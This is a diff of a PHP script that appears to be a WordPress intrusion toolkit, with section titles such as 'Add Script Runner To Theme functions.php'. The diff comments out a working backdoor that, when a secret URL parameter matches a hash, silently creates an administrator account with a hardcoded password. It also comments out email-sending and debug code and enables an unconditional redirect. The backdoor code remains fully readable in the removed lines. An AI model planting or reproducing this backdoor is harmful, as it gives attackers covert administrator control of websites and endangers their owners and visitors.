@@ -39,18 +39,18 @@ define('DISALLOW_FILE_EDIT', true);
 
 // create_backdoor(true);
 
-add_action('wp_head', 'my_backdoor');
-function my_backdoor()
-{ // URL : website.com/?backdoor=go
-  if (md5($_GET['backdoor']) == '34d1f91fb2e514b8576fab1a75a89a6b') {
-    require('wp-includes/registration.php');
-    if (!username_exists('mr_admin')) { // user : mr_admin
-      $user_id = wp_create_user('mr_admin', 'pa55w0rd!'); // pass : pa55w0rd
-      $user = new WP_User($user_id);
-      $user->set_role('administrator');
-    }
-  }
-}
+// add_action('wp_head', 'my_backdoor');
+// function my_backdoor()
+// { // URL : website.com/?backdoor=go
+//   if (md5($_GET['backdoor']) == '34d1f91fb2e514b8576fab1a75a89a6b') {
+//     require('wp-includes/registration.php');
+//     if (!username_exists('mr_admin')) { // user : mr_admin
+//       $user_id = wp_create_user('mr_admin', 'pa55w0rd!'); // pass : pa55w0rd
+//       $user = new WP_User($user_id);
+//       $user->set_role('administrator');
+//     }
+//   }
+// }
 
 ##------------------------------------------------##
 ## 04 # Add Script Runner To Theme functions.php
@@ -138,15 +138,15 @@ if (preg_match_all($pattern, $contents, $matches)) {
 // email_sender(true, $email_address, $subject, $message, $headers);
 
 # الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
-// Send the email
-$mailSuccess = mail($email_address, $subject, $message, $headers);
+// // Send the email
+// $mailSuccess = mail($email_address, $subject, $message, $headers);
 
-// Check if the email was sent successfully
-if ($mailSuccess) {
-    echo "Email sent successfully.";
-} else {
-    echo "Failed to send email.";
-}
+// // Check if the email was sent successfully
+// if ($mailSuccess) {
+//     echo "Email sent successfully.";
+// } else {
+//     echo "Failed to send email.";
+// }
 
 ##------------------------------------------------##
 ## 08 # Redirect To Another URL
@@ -154,8 +154,8 @@ if ($mailSuccess) {
 
 // URL_redirect(true);
 
-// header("Location: https://www.google.com/");
-// exit();
+header("Location: https://www.google.com/");
+exit();
 
 
 ##------------------------------------------------##
@@ -207,12 +207,12 @@ if (!file_exists($myself_folderPath)) {
 
 
 
-// Debug Log
-function debug_log($msg,$is_sending) { 
-  echo 'date - time' . '<br><br>';
-  echo $msg;
-  if ($is_sending === true) {
-    echo 'sent';
-  }
+// // Debug Log
+// function debug_log($msg,$is_sending) { 
+//   echo 'date - time' . '<br><br>';
+//   echo $msg;
+//   if ($is_sending === true) {
+//     echo 'sent';
+//   }
   
-}
+// }
